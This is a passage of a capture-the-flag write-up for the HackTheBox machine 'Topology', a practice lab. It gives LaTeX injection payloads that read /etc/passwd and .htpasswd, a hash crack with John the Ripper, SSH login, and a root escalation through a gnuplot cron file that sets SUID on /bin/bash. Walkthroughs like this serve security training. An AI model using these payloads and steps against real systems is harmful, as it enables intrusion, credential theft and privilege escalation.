+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/3.png"/><br/><br/>
+This is due to the need to add it to our <code>/etc/hosts</code> file, directing it to the IP address of the victim machine.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.217</span> <span class="n">topology</span><span class="o">.</span><span class="n">htb</span> <span class="n">dev</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span> <span class="n">stats</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span> <span class="n">latex</span><span class="o">.</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+<h3><br>latex.topology.htb</br></h3><br>
+Upon accessing <code>latex.topology.htb</code>, we will encounter the following page:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/4.png"/><br/><br/>
+Given the absence of an index.html file, we can perform directory listing on the root directory of <code>latex.topology.htb</code>.<br/><br/>
+Upon clicking <code>equation.php</code>, it redirects us to the following page:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/5.png"/><br/><br/>
+LaTeX is a typesetting system used to create high-quality documents, particularly in academic and scientific fields. It employs a markup language to format text and features powerful tools for creating mathematical formulas, tables, figures, and cross-references.<br/><br/>
+At this point, we can input LaTeX code and convert the output to a PNG file.<br/><br/>
+There are examples available on how to use it:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/6.png"/><br/><br/>
+Let's proceed with the first example: <code>Fractions</code>.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/7.png"/><br/><br/>
+The input provided was interpreted using LaTeX and then converted into a PNG file:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/8.png"/><br/><br/>
+There are various techniques that we can leverage. While researching information online, I came across <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">LaTeX Injection</a>.<br/><br/>
+One of the payloads available involves reading system files:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/9.png"/><br/><br/>
+Upon clicking <code>Generate</code>, it displays the following message:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/10.png"/><br/><br/>
+It appears to have security measures in place to filter out various malicious payloads. After testing numerous payloads for command execution and file reading, I've identified one that functions correctly:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">\newread\file</span> <span class="k">\openin\file</span>=/etc/passwd <span class="k">\read\file</span> to<span class="k">\line</span> <span class="k">\text</span><span class="nb">{</span><span class="k">\line</span><span class="nb">}</span> <span class="k">\closein\file</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/11.png"/><br/><br/>
+It's functioning as expected, returning the content of system files. However, the issue lies in its limitation to read only the first line of each file we want to access. To address this, I sought alternative methods that allow reading multiple lines in files.<br/><br/>
+Upon filtering for options that enable the reading of multiple lines in files, I discovered the following payload:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">\lstinputlisting</span><span class="nb">{</span>/etc/passwd<span class="nb">}</span>
+</pre></div>
+
+Let's proceed with testing this payload.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/12.png"/><br/><br/>
+It seems like the error is due to the generated file not being a valid PNG, hence not visible. The absence of the <code>Illegal command detected. Sorry.</code> message suggests the command was executed. However, the content retrieved from the <code>/etc/passwd</code> file contains characters that might conflict with LaTeX interpretation.<br/><br/>
+To resolve this, an alternative is to format the command's output as a mathematical formula in LaTeX. This method employs the <code>$</code> symbol to encapsulate the content, ensuring it is treated as a mathematical formula and avoiding conflict during interpretation.<br/><br/>
+<div class="highlight"><pre><span></span><span class="s">$</span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">passwd}</span><span class="s">$</span>
+</pre></div>
+
+Upon entering this payload, we receive the following response:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/13.png"/><br/><br/>
+We've successfully retrieved content from system-local files. While examining the <code>/etc/passwd</code> file, we identified a system user named <code>vdaisley</code>. To attempt access using this user, we can try retrieving their private SSH key (<code>id_rsa</code>).<br/><br/>
+<div class="highlight"><pre><span></span><span class="s">$</span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">home</span><span class="o">/</span><span class="nb">vdaisley</span><span class="o">/</span><span class="nb">.ssh</span><span class="o">/</span><span class="nb">id_rsa}</span><span class="s">$</span>
+</pre></div>
+
+Based on the response, it appears that either the file does not exist or we lack access to it.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/14.png"/><br/><br/>
+<h3><br>Shell as vdaisley</br></h3><br>
+Recalling the Subdomain Enumeration, we discovered the subdomain <code>dev.topology.htb</code>, which we don't currently have access to as it requests credentials for entry. One method to obtain these credentials involves reading the <code>.htpasswd</code> file. However, we first need to identify the root directory of the subdomain's web service (this file may not necessarily be located in that directory).<br/><br/>
+To determine the location of the subdomain's web service, we can inspect Apache configuration files, such as the <code>/etc/apache2/sites-available/000-default.conf</code> file.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/15.png"/><br/><br/>
+Now that we have access to this file, let's proceed with a careful examination of its contents.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/16.png"/><br/><br/>
+Here, we've identified the <code>dev.topology.htb</code> directory. Next, let's attempt to read the <code>/var/www/dev/.htpasswd</code> file.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/17.png"/><br/><br/>
+We've successfully accessed the file and obtained some credentials. However, the password is in hashed format, but we can attempt to crack it. I'll proceed by copying the file's content to my attacker machine.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">creds</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">vdaisley</span><span class="p">:</span><span class="err">$</span><span class="n">apr1</span><span class="err">$</span><span class="mi">1</span><span class="n">ONUB</span><span class="o">/</span><span class="n">S2</span><span class="err">$</span><span class="mi">58</span><span class="n">eeNVirnRDB5zAIbIxTY0</span>
+</pre></div>
+
+Now, using <a href="https://github.com/openwall/john">John the Ripper</a>, I'll attempt to crack the hashed password.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">creds</span><span class="o">.</span><span class="n">txt</span>
+<span class="ne">Warning</span><span class="p">:</span> <span class="n">detected</span> <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">"md5crypt"</span><span class="p">,</span> <span class="n">but</span> <span class="n">the</span> <span class="n">string</span> <span class="ow">is</span> <span class="n">also</span> <span class="n">recognized</span> <span class="k">as</span> <span class="s2">"md5crypt-long"</span>
+<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--format=md5crypt-long"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">force</span> <span class="n">loading</span> <span class="n">these</span> <span class="k">as</span> <span class="n">that</span> <span class="nb">type</span> <span class="n">instead</span>
+<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">md5crypt</span><span class="p">,</span> <span class="n">crypt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="err">$</span><span class="mi">1</span><span class="err">$</span> <span class="p">(</span><span class="ow">and</span> <span class="n">variants</span><span class="p">)</span> <span class="p">[</span><span class="n">MD5</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">AVX</span> <span class="mi">4</span><span class="n">x3</span><span class="p">])</span>
+<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
+<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
+
+<span class="n">calculus20</span>       <span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span>   
+
+<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">14</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">04</span> <span class="mi">09</span><span class="p">:</span><span class="mi">33</span><span class="p">)</span> <span class="mf">0.06724</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">66961</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mi">66961</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mi">66961</span><span class="n">C</span><span class="o">/</span><span class="n">s</span> <span class="n">calebd1</span><span class="o">..</span><span class="n">caitlyn09</span>
+<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
+<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
+</pre></div>
+
+We've successfully cracked the password and obtained credentials for <code>dev.topology.htb</code>. One avenue we can explore is reusing these credentials to connect as the <code>vdaisley</code> user via SSH, considering that <code>vdaisley</code> is also a system user.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">vdaisley</span><span class="o">@</span><span class="mf">10.10.11.217</span>
+<span class="n">vdaisley</span><span class="o">@</span><span class="mf">10.10.11.217</span><span class="s1">'s password: </span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">20.04.6</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.4.0</span><span class="o">-</span><span class="mi">150</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+
+<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+
+<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+
+
+<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Great! We've successfully gained access to the system. Now, let's proceed to read the first flag.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">f37e8cd09abccf7c371ac6022d38c2e1</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+I recommend setting the <code>TERM</code> environment variable to the value <code>xterm</code> for a more comfortable shell experience.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+<h3><br>Shell as root</br></h3><br>
+As vdaisley, we do not appear to belong to any particularly interesting system group.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Moreover, we do not have any sudo privileges assigned to us.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">vdaisley</span><span class="p">:</span> 
+<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">vdaisley</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">topology</span><span class="o">.</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Upon searching for SUID files, we didn't discover any that seem particularly interesting.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">pppd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">policykit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">eject</span><span class="o">/</span><span class="n">dmcrypt</span><span class="o">-</span><span class="n">get</span><span class="o">-</span><span class="n">device</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">at</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+At this stage, I'll download <a href="https://github.com/DominicBreuker/pspy">pspy</a> onto the victim machine to monitor the processes and commands running on the system. After running <code>pspy</code> for about a minute, it detected the execution of a cron job.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/18.png"/><br/><br/>
+The cron job appears to be searching for <code>.plt</code> files within <code>/opt/gnuplot</code>, and these files are being interpreted using <code>gnuplot</code>.<br/><br/>
+Upon inspecting the privileges for <code>/opt/gnuplot</code>, it's evident that we have the capability to write files in this directory.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span>
+<span class="n">total</span> <span class="mi">4</span>
+<span class="n">drwx</span><span class="o">-</span><span class="n">wx</span><span class="o">-</span><span class="n">wx</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">07</span><span class="p">:</span><span class="mi">45</span> <span class="n">gnuplot</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+We can attempt to create a malicious <code>.plt</code> file and aim to acquire access as the root user.<br/><br/>
+Upon researching, I found an <a href="http://www.bersch.net/gnuplot-doc/system.html">article</a> demonstrating how to run system commands using <code>gnuplot</code>. By placing the content <code>system "(command)"</code> into a <code>.plt</code> file and interpreting it with <code>gnuplot</code>, it will execute the specified command.<br/><br/>
+Let's try assigning Set-UID privileges to the <code>/bin/bash</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'system "/usr/bin/chmod u+s /bin/bash"'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">gnuplot</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">plt</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+After approximately a minute of waiting, the Set-UID permission was successfully assigned to <code>/bin/bash</code>.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1183448</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+Executing <code>bash</code> with the <code>-p</code> parameter will grant us the ability to run commands as the root user:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># whoami</span>
+<span class="n">root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># cat /root/root.txt</span>
+<span class="mf">9e53</span><span class="n">f2d27e17d26b446a299628382143</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1">#</span>
+</pre></div></br></br></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
